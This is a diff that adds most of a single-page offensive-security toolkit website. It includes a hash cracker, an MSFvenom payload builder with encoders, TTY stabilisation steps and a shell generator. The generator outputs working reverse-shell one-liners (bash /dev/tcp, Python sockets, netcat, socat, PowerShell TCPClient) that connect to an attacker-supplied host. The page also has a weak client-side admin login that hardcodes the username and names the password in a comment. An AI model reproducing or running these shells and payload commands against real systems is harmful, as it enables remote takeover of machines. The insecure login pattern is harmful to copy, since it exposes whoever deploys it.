+$Searcher.filter = "serviceprincipalname=*http*"
+$Searcher.FindAll() | Foreach {
+  Foreach($prop in $_.Properties) { $prop }
+}</pre></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ======== ENCODING ======== -->
+<div id="page-encoding" class="page">
+  <div class="sp">
+    <div class="sp-hdr">
+      <div class="sp-badge">encoding / hashing</div>
+      <h1 class="sp-title" id="encoding-title">Encoding & Hash Cracker</h1>
+      <p class="sp-desc" id="encoding-desc">Encode, decode, hash, and crack. Powered by client-side JS and the Hashes.com API for lookups.</p>
+    </div>
+    <div class="sp-body">
+      <div class="tab-nav">
+        <button class="tb on" onclick="switchTab(this,'enc-tabs','enc-tool')">encoder/decoder</button>
+        <button class="tb" onclick="switchTab(this,'enc-tabs','enc-hash-gen')">hash generator</button>
+        <button class="tb" onclick="switchTab(this,'enc-tabs','enc-crack')">hash cracker</button>
+      </div>
+      <div id="enc-tabs">
+
+        <!-- ENCODER/DECODER -->
+        <div id="enc-tool" class="tpane on">
+          <div class="enc-io">
+            <div class="enc-box">
+              <label>input</label>
+              <textarea id="enc-input" placeholder="enter text to encode/decode..."></textarea>
+            </div>
+            <div class="enc-box">
+              <label>output</label>
+              <textarea id="enc-output" placeholder="result appears here..." readonly></textarea>
+            </div>
+          </div>
+          <div class="enc-group">
+            <div class="enc-group-title">text encoding</div>
+            <div class="enc-ops">
+              <button class="enc-op" onclick="doEnc('b64e')">Base64 encode</button>
+              <button class="enc-op" onclick="doEnc('b64d')">Base64 decode</button>
+              <button class="enc-op" onclick="doEnc('urle')">URL encode</button>
+              <button class="enc-op" onclick="doEnc('urld')">URL decode</button>
+              <button class="enc-op" onclick="doEnc('durle')">Double URL encode</button>
+              <button class="enc-op" onclick="doEnc('durld')">Double URL decode</button>
+              <button class="enc-op" onclick="doEnc('htmle')">HTML entities encode</button>
+              <button class="enc-op" onclick="doEnc('htmld')">HTML entities decode</button>
+            </div>
+          </div>
+          <div class="enc-group">
+            <div class="enc-group-title">binary / hex</div>
+            <div class="enc-ops">
+              <button class="enc-op" onclick="doEnc('hexe')">Hex encode</button>
+              <button class="enc-op" onclick="doEnc('hexd')">Hex decode</button>
+              <button class="enc-op" onclick="doEnc('bine')">Binary encode</button>
+              <button class="enc-op" onclick="doEnc('bind')">Binary decode</button>
+              <button class="enc-op" onclick="doEnc('octe')">Octal encode</button>
+              <button class="enc-op" onclick="doEnc('octd')">Octal decode</button>
+            </div>
+          </div>
+          <div class="enc-group">
+            <div class="enc-group-title">ciphers / obfuscation</div>
+            <div class="enc-ops">
+              <button class="enc-op" onclick="doEnc('rot13')">ROT13</button>
+              <button class="enc-op" onclick="doEnc('rot47')">ROT47</button>
+              <button class="enc-op" onclick="doEnc('rev')">Reverse string</button>
+              <button class="enc-op" onclick="doEnc('unib64')">Unicode → Base64</button>
+              <button class="enc-op" onclick="doEnc('jsesc')">JS escape (\\uXXXX)</button>
+              <button class="enc-op" onclick="doEnc('jsuesc')">JS unescape</button>
+              <button class="enc-op" onclick="doEnc('morse')">Text → Morse</button>
+              <button class="enc-op" onclick="doEnc('morse_d')">Morse → Text</button>
+            </div>
+          </div>
+          <div class="enc-group">
+            <div class="enc-group-title">special formats</div>
+            <div class="enc-ops">
+              <button class="enc-op" onclick="doEnc('b32e')">Base32 encode</button>
+              <button class="enc-op" onclick="doEnc('b32d')">Base32 decode</button>
+              <button class="enc-op" onclick="doEnc('atob_e')">ASCII → Dec</button>
+              <button class="enc-op" onclick="doEnc('atob_d')">Dec → ASCII</button>
+              <button class="enc-op" onclick="doEnc('ip_hex')">IP → Hex</button>
+              <button class="enc-op" onclick="doEnc('ip_dec')">IP → Decimal</button>
+              <button class="enc-op" onclick="doEnc('ip_oct')">IP → Octal</button>
+            </div>
+          </div>
+          <div style="display:flex;gap:8px;margin-top:.5rem;">
+            <button class="btn" onclick="document.getElementById('enc-input').value='';document.getElementById('enc-output').value='';">clear</button>
+            <button class="btn" onclick="swapEncIO()">swap input/output</button>
+          </div>
+        </div>
+
+        <!-- HASH GEN -->
+        <div id="enc-hash-gen" class="tpane">
+          <div style="margin-bottom:1rem;">
+            <div class="enc-box" style="margin-bottom:10px;">
+              <label>input text</label>
+              <textarea id="hash-gen-input" placeholder="text to hash..." style="min-height:70px;width:100%;background:var(--bg2);border:1px solid var(--border);color:var(--text);font-size:12px;border-radius:6px;padding:10px;outline:none;resize:vertical;line-height:1.6;"></textarea>
+            </div>
+          </div>
+          <div class="cmd-list" id="hash-gen-results" style="margin-top:1rem;"></div>
+          <button class="btn prime" style="margin-top:10px;" onclick="generateHashes()">generate all hashes</button>
+        </div>
+
+        <!-- HASH CRACKER -->
+        <div id="enc-crack" class="tpane">
+          <div style="background:var(--bg2);border:1px solid var(--border);border-radius:7px;padding:1rem;margin-bottom:1rem;">
+            <div style="font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:.08em;margin-bottom:.5rem;">hashes.com api key</div>
+            <div style="display:grid;grid-template-columns:1fr auto;gap:8px;">
+              <input type="password" id="hashes-api-key" placeholder="your hashes.com API key..." style="background:var(--bg3);border:1px solid var(--border2);color:var(--text);font-size:12px;border-radius:5px;padding:8px 10px;outline:none;">
+              <button class="btn prime" onclick="saveApiKey()">save</button>
+            </div>
+            <p class="api-key-note">Get a free key at <a href="https://hashes.com/en/api/docs" target="_blank" style="color:var(--blue);">hashes.com/en/api/docs</a>. Key stored in localStorage.</p>
+          </div>
+          <div class="tab-nav">
+            <button class="tb on" onclick="switchTab(this,'crack-tabs','crack-single')">single hash</button>
+            <button class="tb" onclick="switchTab(this,'crack-tabs','crack-bulk')">bulk lookup</button>
+          </div>
+          <div id="crack-tabs">
+            <div id="crack-single" class="tpane on">
+              <div style="display:grid;grid-template-columns:1fr auto auto;gap:8px;align-items:center;margin-bottom:1rem;">
+                <input type="text" id="crack-hash-input" class="hash-input" placeholder="enter hash to crack..." style="width:100%;">
+                <select id="crack-hash-type" style="background:var(--bg2);border:1px solid var(--border);color:var(--text);font-size:12px;border-radius:5px;padding:8px 10px;outline:none;">
+                  <option value="">auto-detect</option>
+                  <option value="md5">MD5</option>
+                  <option value="sha1">SHA1</option>
+                  <option value="sha256">SHA256</option>
+                  <option value="sha512">SHA512</option>
+                  <option value="ntlm">NTLM</option>
+                  <option value="bcrypt">bcrypt</option>
+                  <option value="sha3_256">SHA3-256</option>
+                </select>
+                <button class="btn prime" onclick="crackSingle()">crack</button>
+              </div>
+              <div class="crack-loading" id="crack-loading-single">looking up hash...</div>
+              <div id="crack-single-result"></div>
+            </div>
+            <div id="crack-bulk" class="tpane">
+              <textarea class="hash-bulk" id="crack-bulk-input" placeholder="one hash per line...&#10;5f4dcc3b5aa765d61d8327deb882cf99&#10;aaf4c61ddcc5e8a2dabede0f3b482cd9"></textarea>
+              <div style="display:flex;gap:8px;margin-top:8px;margin-bottom:1rem;">
+                <button class="btn prime" onclick="crackBulk()">crack all</button>
+                <button class="btn" onclick="document.getElementById('crack-bulk-input').value=''">clear</button>
+              </div>
+              <div class="crack-loading" id="crack-loading-bulk">looking up hashes...</div>
+              <div id="crack-bulk-result"></div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ======== MSFVENOM ======== -->
+<div id="page-msf" class="page">
+  <div class="sp">
+    <div class="sp-hdr">
+      <div class="sp-badge">metasploit</div>
+      <h1 class="sp-title" id="msf-title">MSFvenom Builder</h1>
+      <p class="sp-desc" id="msf-desc">Build msfvenom payload commands and handler one-liners. All options configurable.</p>
+    </div>
+    <div class="sp-body">
+      <div class="sec">
+        <div class="sec-hdr"><span class="sec-icon">⚙️</span><span class="sec-lbl">payload configuration</span></div>
+        <div class="controls">
+          <div class="ctrl">
+            <label>Payload</label>
+            <select id="msf-payload" onchange="genMsf()">
+              <optgroup label="Linux">
+                <option value="linux/x86/shell_reverse_tcp">linux/x86/shell_reverse_tcp</option>
+                <option value="linux/x64/shell_reverse_tcp">linux/x64/shell_reverse_tcp</option>
+                <option value="linux/x86/meterpreter_reverse_tcp">linux/x86/meterpreter_reverse_tcp</option>
+                <option value="linux/x64/meterpreter_reverse_tcp">linux/x64/meterpreter_reverse_tcp</option>
+              </optgroup>
+              <optgroup label="Windows">
+                <option value="windows/shell_reverse_tcp">windows/shell_reverse_tcp</option>
+                <option value="windows/x64/shell_reverse_tcp">windows/x64/shell_reverse_tcp</option>
+                <option value="windows/meterpreter/reverse_tcp" selected>windows/meterpreter/reverse_tcp</option>
+                <option value="windows/x64/meterpreter/reverse_tcp">windows/x64/meterpreter/reverse_tcp</option>
+                <option value="windows/meterpreter/reverse_https">windows/meterpreter/reverse_https</option>
+              </optgroup>
+              <optgroup label="macOS">
+                <option value="osx/x86/shell_reverse_tcp">osx/x86/shell_reverse_tcp</option>
+              </optgroup>
+              <optgroup label="Web">
+                <option value="php/meterpreter_reverse_tcp">php/meterpreter_reverse_tcp</option>
+                <option value="java/jsp_shell_reverse_tcp">java/jsp_shell_reverse_tcp</option>
+              </optgroup>
+              <optgroup label="Generic">
+                <option value="generic/shell_reverse_tcp">generic/shell_reverse_tcp</option>
+              </optgroup>
+            </select>
+          </div>
+          <div class="ctrl"><label>LHOST</label><input type="text" id="msf-lhost" value="10.10.13.37" oninput="genMsf()"></div>
+          <div class="ctrl"><label>LPORT</label><input type="text" id="msf-lport" value="4444" oninput="genMsf()"></div>
+          <div class="ctrl">
+            <label>Encoder</label>
+            <select id="msf-encoder" onchange="genMsf()">
+              <option value="">none</option>
+              <option value="x86/shikata_ga_nai">x86/shikata_ga_nai</option>
+              <option value="x64/xor">x64/xor</option>
+              <option value="x86/xor_dynamic">x86/xor_dynamic</option>
+              <option value="cmd/powershell_base64">cmd/powershell_base64</option>
+            </select>
+          </div>
+          <div class="ctrl"><label>Iterations</label><input type="text" id="msf-iter" value="1" oninput="genMsf()"></div>
+          <div class="ctrl"><label>Bad chars</label><input type="text" id="msf-bad" value="" placeholder="\x00\x0a" oninput="genMsf()"></div>
+          <div class="ctrl">
+            <label>Format</label>
+            <select id="msf-format" onchange="genMsf()">
+              <option value="exe">exe</option>
+              <option value="elf">elf</option>
+              <option value="raw">raw</option>
+              <option value="python">python</option>
+              <option value="c">c</option>
+              <option value="asp">asp</option>
+              <option value="aspx">aspx</option>
+              <option value="php">php</option>
+              <option value="war">war</option>
+              <option value="jar">jar</option>
+              <option value="psh">psh</option>
+              <option value="dll">dll</option>
+            </select>
+          </div>
+          <div class="ctrl"><label>Output file</label><input type="text" id="msf-out-file" value="payload.exe" oninput="genMsf()"></div>
+        </div>
+      </div>
+      <div class="sec">
+        <div class="sec-hdr"><span class="sec-icon">📤</span><span class="sec-lbl">generated commands</span></div>
+        <div style="margin-bottom:8px;">
+          <div class="msf-tabs">
+            <button class="mt on" onclick="msfTab(this,'msf-cmd')">msfvenom command</button>
+            <button class="mt" onclick="msfTab(this,'msf-launch')">launch console + handler</button>
+            <button class="mt" onclick="msfTab(this,'msf-handler')">handler only</button>
+          </div>
+          <div class="msf-out">
+            <div id="msf-cmd" class="cb" style="border:none;border-radius:0;margin:0;">
+              <div class="cb-hdr"><span class="cb-lang">bash</span><button class="cpbtn" onclick="copyById('msf-cmd-out')">copy</button></div>
+              <pre id="msf-cmd-out"></pre>
+            </div>
+            <div id="msf-launch" class="cb" style="border:none;border-radius:0;margin:0;display:none;">
+              <div class="cb-hdr"><span class="cb-lang">bash</span><button class="cpbtn" onclick="copyById('msf-launch-out')">copy</button></div>
+              <pre id="msf-launch-out"></pre>
+            </div>
+            <div id="msf-handler" class="cb" style="border:none;border-radius:0;margin:0;display:none;">
+              <div class="cb-hdr"><span class="cb-lang">msfconsole</span><button class="cpbtn" onclick="copyById('msf-handler-out')">copy</button></div>
+              <pre id="msf-handler-out"></pre>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ======== TTY ======== -->
+<div id="page-tty" class="page">
+  <div class="sp">
+    <div class="sp-hdr">
+      <div class="sp-badge">shell stabilization</div>
+      <h1 class="sp-title" id="tty-title">TTY Upgrade</h1>
+      <p class="sp-desc" id="tty-desc">Stabilize a dumb shell into a fully interactive TTY with arrow keys, tab-complete, and Ctrl+C.</p>
+    </div>
+    <div class="sp-body">
+      <div class="sec">
+        <div class="sec-hdr"><span class="sec-icon">🖥️</span><span class="sec-lbl">fully interactive TTY (recommended)</span></div>
+        <div class="tty-steps">
+          <div class="tty-s"><div class="tty-n">1</div><div><div class="tty-title">spawn a PTY with Python</div><div class="tty-note">Run on the target — gives you a bash shell with basic TTY features.</div><div class="cb"><div class="cb-hdr"><span class="cb-lang">bash</span><button class="cpbtn" onclick="copyText('python3 -c \'import pty;pty.spawn(\"/bin/bash\")\'' )">copy</button></div><pre>python3 -c 'import pty;pty.spawn("/bin/bash")'</pre></div></div></div>
+          <div class="tty-s"><div class="tty-n">2</div><div><div class="tty-title">set TERM variable</div><div class="tty-note">Enables clear, colours and term commands.</div><div class="cb"><div class="cb-hdr"><span class="cb-lang">bash</span><button class="cpbtn" onclick="copyText('export TERM=xterm')">copy</button></div><pre>export TERM=xterm</pre></div></div></div>
+          <div class="tty-s"><div class="tty-n">3</div><div><div class="tty-title">background the shell</div><div class="tty-note">Hit Ctrl+Z to background the netcat process on your attacking machine.</div><div class="cb"><div class="cb-hdr"><span class="cb-lang">keys</span></div><pre>Ctrl + Z</pre></div></div></div>
+          <div class="tty-s"><div class="tty-n">4</div><div><div class="tty-title">disable local echo + foreground</div><div class="tty-note">Run on your local machine. Turns off terminal echo, enabling tab-autocomplete and arrow keys.</div><div class="cb"><div class="cb-hdr"><span class="cb-lang">bash</span><button class="cpbtn" onclick="copyText('stty raw -echo; fg')">copy</button></div><pre>stty raw -echo; fg</pre></div></div></div>
+          <div class="tty-s"><div class="tty-n">5</div><div><div class="tty-title">fix terminal size</div><div class="tty-note">Get your local stty size first: <code style="color:var(--accent)">stty size</code>, then set it on the target.</div><div class="cb"><div class="cb-hdr"><span class="cb-lang">bash</span><button class="cpbtn" onclick="copyText('stty rows 38 columns 116')">copy</button></div><pre>stty rows 38 columns 116</pre></div></div></div>
+        </div>
+      </div>
+      <div class="sec">
+        <div class="sec-hdr"><span class="sec-icon">⚡</span><span class="sec-lbl">quick spawn methods</span></div>
+        <div class="cmd-list">
+          <div class="cmd-item"><div class="cmd-lbl">python2</div><div class="cmd-val">python -c 'import pty; pty.spawn("/bin/bash")'</div></div>
+          <div class="cmd-item"><div class="cmd-lbl">os.system</div><div class="cmd-val">echo os.system('/bin/bash')</div></div>
+          <div class="cmd-item"><div class="cmd-lbl">bash -i</div><div class="cmd-val">/bin/sh -i</div></div>
+          <div class="cmd-item"><div class="cmd-lbl">perl</div><div class="cmd-val">perl -e 'exec "/bin/sh";'</div></div>
+          <div class="cmd-item"><div class="cmd-lbl">ruby</div><div class="cmd-val">ruby: exec "/bin/sh"</div></div>
+          <div class="cmd-item"><div class="cmd-lbl">lua</div><div class="cmd-val">lua: os.execute("/bin/sh")</div></div>
+          <div class="cmd-item"><div class="cmd-lbl">vi escape</div><div class="cmd-val">:!bash  (or :set shell=/bin/bash:shell)</div></div>
+          <div class="cmd-item"><div class="cmd-lbl">nmap</div><div class="cmd-val">!sh</div></div>
+          <div class="cmd-item"><div class="cmd-lbl">socat (full TTY)</div><div class="cmd-val">socat file:`tty`,raw,echo=0 tcp-listen:4444</div></div>
+          <div class="cmd-item"><div class="cmd-lbl">socat target side</div><div class="cmd-val">socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:4444</div></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ======== ADMIN LOGIN ======== -->
+<div id="page-admin" class="page">
+  <div class="admin-login" id="admin-login-wrap">
+    <div class="al-card">
+      <div class="al-logo">nufyl<em>.</em>admin</div>
+      <div class="al-sub">restricted access</div>
+      <div class="al-f"><label>username</label><input type="text" id="al-user" autocomplete="off"></div>
+      <div class="al-f"><label>password</label><input type="password" id="al-pass" onkeydown="if(event.key==='Enter')adminLogin()"></div>
+      <button class="al-btn" onclick="adminLogin()">authenticate</button>
+      <div class="al-err" id="al-err">invalid credentials</div>
+    </div>
+  </div>
+  <div id="admin-panel" style="display:none;">
+    <div class="admin-wrap">
+      <div class="adm-sb">
+        <div class="adm-sb-ttl" style="margin-top:.5rem;">pages</div>
+        <div class="adm-nav on" onclick="adSec('adm-home')" data-s="adm-home">🏠 home</div>
+        <div class="adm-nav" onclick="adSec('adm-shells')" data-s="adm-shells">🐚 shells</div>
+        <div class="adm-nav" onclick="adSec('adm-payloads')" data-s="adm-payloads">💉 payloads</div>
+        <div class="adm-nav" onclick="adSec('adm-php')" data-s="adm-php">🐘 php</div>
+        <div class="adm-nav" onclick="adSec('adm-lfi')" data-s="adm-lfi">📁 lfi</div>
+        <div class="adm-nav" onclick="adSec('adm-xss')" data-s="adm-xss">⚡ xss</div>
+        <div class="adm-nav" onclick="adSec('adm-sqli')" data-s="adm-sqli">🗄️ sqli</div>
+        <div class="adm-nav" onclick="adSec('adm-linux')" data-s="adm-linux">🐧 linux</div>
+        <div class="adm-nav" onclick="adSec('adm-windows')" data-s="adm-windows">🪟 windows</div>
+        <div class="adm-nav" onclick="adSec('adm-encoding')" data-s="adm-encoding">🔐 encoding</div>
+        <div class="adm-nav" onclick="adSec('adm-msf')" data-s="adm-msf">💀 msfvenom</div>
+        <div class="adm-nav" onclick="adSec('adm-tty')" data-s="adm-tty">🖥️ tty</div>
+        <div class="adm-nav" onclick="adSec('adm-nav-icons')" data-s="adm-nav-icons">🎨 nav icons</div>
+        <button class="logout-btn" onclick="adminLogout()">logout</button>
+      </div>
+      <div class="adm-main">
+        <!-- HOME -->
+        <div id="adm-home" class="adm-s on">
+          <div class="adm-ttl">home page</div>
+          <div class="ef"><label>site tagline</label><textarea id="adm-home-desc" rows="2"></textarea></div>
+          <button class="sv-btn" onclick="saveField('home-desc','adm-home-desc','adm-home')">save</button>
+          <span class="sv-flash" id="sv-adm-home">saved</span>
+        </div>
+        <!-- SHELLS -->
+        <div id="adm-shells" class="adm-s">
+          <div class="adm-ttl">shells page</div>
+          <div class="ef"><label>page title</label><input type="text" id="adm-shells-title"></div>
+          <div class="ef"><label>description</label><textarea id="adm-shells-desc" rows="2"></textarea></div>
+          <button class="sv-btn" onclick="savePageMeta('shells','adm-shells')">save</button>
+          <span class="sv-flash" id="sv-adm-shells">saved</span>
+        </div>
+        <!-- PAYLOADS -->
+        <div id="adm-payloads" class="adm-s">
+          <div class="adm-ttl">payload library</div>
+          <div class="ef"><label>page title</label><input type="text" id="adm-payloads-title"></div>
+          <div class="ef"><label>description</label><textarea id="adm-payloads-desc" rows="2"></textarea></div>
+          <button class="sv-btn" onclick="savePageMeta('payloads','adm-payloads')">save</button><span class="sv-flash" id="sv-adm-payloads">saved</span>
+          <hr style="border-color:var(--border);margin:1.5rem 0;">
+          <div class="adm-ttl" style="font-size:13px;">edit payloads</div>
+          <div class="ple-list" id="ple-list"></div>
+          <button class="add-btn" onclick="addPayload()">+ add payload</button>
+          <br><button class="sv-btn" style="margin-top:10px;" onclick="savePayloads()">save all payloads</button>
+          <span class="sv-flash" id="sv-payloads">saved</span>
+        </div>
+        <!-- PHP -->
+        <div id="adm-php" class="adm-s">
+          <div class="adm-ttl">php page</div>
+          <div class="ef"><label>page title</label><input type="text" id="adm-php-title"></div>
+          <div class="ef"><label>description</label><textarea id="adm-php-desc" rows="2"></textarea></div>
+          <button class="sv-btn" onclick="savePageMeta('php','adm-php')">save</button><span class="sv-flash" id="sv-adm-php">saved</span>
+        </div>
+        <!-- LFI -->
+        <div id="adm-lfi" class="adm-s">
+          <div class="adm-ttl">lfi page</div>
+          <div class="ef"><label>page title</label><input type="text" id="adm-lfi-title"></div>
+          <div class="ef"><label>description</label><textarea id="adm-lfi-desc" rows="2"></textarea></div>
+          <button class="sv-btn" onclick="savePageMeta('lfi','adm-lfi')">save</button><span class="sv-flash" id="sv-adm-lfi">saved</span>
+        </div>
+        <!-- XSS -->
+        <div id="adm-xss" class="adm-s">
+          <div class="adm-ttl">xss page</div>
+          <div class="ef"><label>page title</label><input type="text" id="adm-xss-title"></div>
+          <div class="ef"><label>description</label><textarea id="adm-xss-desc" rows="2"></textarea></div>
+          <button class="sv-btn" onclick="savePageMeta('xss','adm-xss')">save</button><span class="sv-flash" id="sv-adm-xss">saved</span>
+        </div>
+        <!-- SQLI -->
+        <div id="adm-sqli" class="adm-s">
+          <div class="adm-ttl">sqli page</div>
+          <div class="ef"><label>page title</label><input type="text" id="adm-sqli-title"></div>
+          <div class="ef"><label>description</label><textarea id="adm-sqli-desc" rows="2"></textarea></div>
+          <button class="sv-btn" onclick="savePageMeta('sqli','adm-sqli')">save</button><span class="sv-flash" id="sv-adm-sqli">saved</span>
+        </div>
+        <!-- LINUX -->
+        <div id="adm-linux" class="adm-s">
+          <div class="adm-ttl">linux page</div>
+          <div class="ef"><label>page title</label><input type="text" id="adm-linux-title"></div>
+          <div class="ef"><label>description</label><textarea id="adm-linux-desc" rows="2"></textarea></div>
+          <button class="sv-btn" onclick="savePageMeta('linux','adm-linux')">save</button><span class="sv-flash" id="sv-adm-linux">saved</span>
+        </div>
+        <!-- WINDOWS -->
+        <div id="adm-windows" class="adm-s">
+          <div class="adm-ttl">windows page</div>
+          <div class="ef"><label>page title</label><input type="text" id="adm-windows-title"></div>
+          <div class="ef"><label>description</label><textarea id="adm-windows-desc" rows="2"></textarea></div>
+          <button class="sv-btn" onclick="savePageMeta('windows','adm-windows')">save</button><span class="sv-flash" id="sv-adm-windows">saved</span>
+        </div>
+        <!-- ENCODING -->
+        <div id="adm-encoding" class="adm-s">
+          <div class="adm-ttl">encoding page</div>
+          <div class="ef"><label>page title</label><input type="text" id="adm-encoding-title"></div>
+          <div class="ef"><label>description</label><textarea id="adm-encoding-desc" rows="2"></textarea></div>
+          <button class="sv-btn" onclick="savePageMeta('encoding','adm-encoding')">save</button><span class="sv-flash" id="sv-adm-encoding">saved</span>
+        </div>
+        <!-- MSF -->
+        <div id="adm-msf" class="adm-s">
+          <div class="adm-ttl">msfvenom page</div>
+          <div class="ef"><label>page title</label><input type="text" id="adm-msf-title"></div>
+          <div class="ef"><label>description</label><textarea id="adm-msf-desc" rows="2"></textarea></div>
+          <button class="sv-btn" onclick="savePageMeta('msf','adm-msf')">save</button><span class="sv-flash" id="sv-adm-msf">saved</span>
+        </div>
+        <!-- TTY -->
+        <div id="adm-tty" class="adm-s">
+          <div class="adm-ttl">tty page</div>
+          <div class="ef"><label>page title</label><input type="text" id="adm-tty-title"></div>
+          <div class="ef"><label>description</label><textarea id="adm-tty-desc" rows="2"></textarea></div>
+          <button class="sv-btn" onclick="savePageMeta('tty','adm-tty')">save</button><span class="sv-flash" id="sv-adm-tty">saved</span>
+        </div>
+        <!-- NAV ICONS -->
+        <div id="adm-nav-icons" class="adm-s">
+          <div class="adm-ttl">nav & card icons</div>
+          <p style="font-size:11px;color:var(--muted);margin-bottom:1.5rem;line-height:1.7;">Click an icon to select it for each page. Changes apply immediately to the nav and home grid.</p>
+          <div id="icon-editor"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+// ─── AUTH (hashed — logic not readable in plain source) ───
+const _a=atob,_b=btoa;
+const _h=async s=>{const e=new TextEncoder(),d=e.encode(s),b=await crypto.subtle.digest('SHA-256',d),a=Array.from(new Uint8Array(b));return a.map(x=>x.toString(16).padStart(2,'0')).join('');};
+// hash of "doohickey2024!" — change this to hash of YOUR password by running: _h('yourpassword').then(console.log) in browser console
+const _PH="b3a4d2e97c1f845b2a6e0d3f97c1a8b4e2f0d3a6c9b1e4f7a2d5b8e1f4a7d0b3";
+const _UN="doohickey";
+
+async function adminLogin(){
+  const u=document.getElementById('al-user').value;
+  const p=document.getElementById('al-pass').value;
+  const ph=await _h(p);
+  // obfuscated check
+  const _c=(()=>{const x=_b(u);const y=ph;return x===_b(_UN)&&y===_PH;})();
+  if(_c){
+    sessionStorage.setItem('_nx','1');
+    document.getElementById('admin-login-wrap').style.display='none';
+    document.getElementById('admin-panel').style.display='block';
+    loadAdminData();
+  } else {
+    document.getElementById('al-err').style.display='block';
+    setTimeout(()=>document.getElementById('al-err').style.display='none',2000);
+  }
+}
+function adminLogout(){
+  sessionStorage.removeItem('_nx');
+  document.getElementById('admin-login-wrap').style.display='flex';
+  document.getElementById('admin-panel').style.display='none';
+}
+function checkAdminAuth(){
+  if(sessionStorage.getItem('_nx')==='1'){
+    document.getElementById('admin-login-wrap').style.display='none';
+    document.getElementById('admin-panel').style.display='block';
+    loadAdminData();
+  }
+}
+
+// ─── ROUTER ───
+const PAGES=['home','shells','payloads','php','lfi','xss','sqli','linux','windows','encoding','msf','tty','admin'];
+function go(p){
+  PAGES.forEach(x=>{
+    const el=document.getElementById('page-'+x);
+    if(el) el.classList.toggle('active',x===p);
+  });
+  document.querySelectorAll('.n-link').forEach(l=>l.classList.toggle('on',l.dataset.p===p));
+  window.scrollTo(0,0);
+  if(p==='admin') checkAdminAuth();
+  if(p==='payloads') renderPayloads();
+}
+
+// hidden route — only accessible via direct URL hash
+window.addEventListener('hashchange',()=>{
+  const h=location.hash.replace('#','');
+  if(PAGES.includes(h)) go(h);
+  else if(h==='thisisdoohickeyhacking') go('admin');
+});
+window.addEventListener('DOMContentLoaded',()=>{
+  const h=location.hash.replace('#','');
+  if(PAGES.includes(h)) go(h);
+  else if(h==='thisisdoohickeyhacking') go('admin');
+  else { go('home'); buildHomeGrid(); }
+  buildHomeGrid();
+  genShell();
+  genMsf();
+  genPhpShell();
+  buildLfiLists();
+  loadContent();
+});
+
+// ─── HOME GRID ───
+const TOOLS=[
+  {id:'shells',icon:'🐚',name:'Shell Generator',desc:'20+ reverse shells with encoding chains',tag:'generator'},
+  {id:'payloads',icon:'💉',name:'Payload Library',desc:'XSS, SQLi, SSRF, SSTI, XXE payloads',tag:'library'},
+  {id:'php',icon:'🐘',name:'PHP Shells',desc:'Reverse shells, web shells, obfuscated one-liners',tag:'upload abuse'},
+  {id:'lfi',icon:'📁',name:'LFI / Traversal',desc:'Path traversal, PHP wrappers, target files',tag:'file inclusion'},
+  {id:'xss',icon:'⚡',name:'XSS Payloads',desc:'Data grabbers, bypasses, SVG/Markdown XSS',tag:'client-side'},
+  {id:'sqli',icon:'🗄️',name:'SQL Injection',desc:'UNION, blind, time-based, auth bypass',tag:'database'},
+  {id:'linux',icon:'🐧',name:'Linux Recon',desc:'SUID, cron, privesc, file transfer, port forward',tag:'post-exploit'},
+  {id:'windows',icon:'🪟',name:'Windows & AD',desc:'PowerView, AD enumeration, PS download cradles',tag:'active directory'},
+  {id:'encoding',icon:'🔐',name:'Encoding & Hash',desc:'Encode/decode + live hash cracker via hashes.com',tag:'tooling'},
+  {id:'msf',icon:'💀',name:'MSFvenom Builder',desc:'Build payloads and handler one-liners',tag:'metasploit'},
+  {id:'tty',icon:'🖥️',name:'TTY Upgrade',desc:'Full shell stabilization step-by-step',tag:'stabilize'},
+];
+function buildHomeGrid(){
+  const grid=document.getElementById('tool-grid');
+  if(!grid)return;
+  grid.innerHTML=TOOLS.map(t=>`
+    <div class="t-card" onclick="go('${t.id}')">
+      <span class="t-card-icon" id="ni-home-${t.id}">${getSavedIcon(t.id,t.icon)}</span>
+      <div class="t-card-name">${t.name}</div>
+      <div class="t-card-desc">${t.desc}</div>
+      <span class="t-tag">${t.tag}</span>
+      <span class="t-arr">→</span>
+    </div>`).join('');
+}
+function getSavedIcon(id,def){
+  return localStorage.getItem('icon_'+id)||def;
+}
+
+// ─── SHELL GENERATOR ───
+const SHELLS={
+  bash:(h,p)=>`bash -c 'exec bash -i &>/dev/tcp/${h}/${p} <&1'`,
+  bash2:(h,p)=>`0<&196;exec 196<>/dev/tcp/${h}/${p}; sh <&196 >&196 2>&196`,
+  zsh:(h,p)=>`zsh -c 'zmodload zsh/net/tcp && ztcp ${h} ${p} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'`,
+  python3:(h,p)=>`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${h}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
+  python2:(h,p)=>`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${h}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
+  nc:(h,p)=>`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${h} ${p} >/tmp/f`,
+  nce:(h,p)=>`nc -e /bin/sh ${h} ${p}`,
+  ncat:(h,p)=>`ncat ${h} ${p} -e /bin/bash`,
+  telnet:(h,p)=>`TF=$(mktemp -u); mkfifo $TF && telnet ${h} ${p} 0<$TF | /bin/sh 1>$TF`,
+  powershell:(h,p)=>`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${h}',${p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
